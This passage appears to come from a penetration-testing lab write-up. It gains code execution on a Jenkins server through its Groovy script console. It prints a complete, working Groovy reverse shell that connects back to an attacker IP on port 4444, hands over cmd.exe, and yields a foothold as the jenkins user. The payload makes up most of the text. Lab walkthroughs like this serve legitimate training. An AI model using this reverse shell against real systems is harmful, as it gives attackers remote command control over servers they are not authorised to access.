We can try for code exec, following this guide here:

https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins

We go the groovy script route. This can be found at `/script`

We can look on github for groovy script rev shells. We use the one found here:
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76



```
String host="192.168.120.129";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

This gives us a foothold as user `jenkins`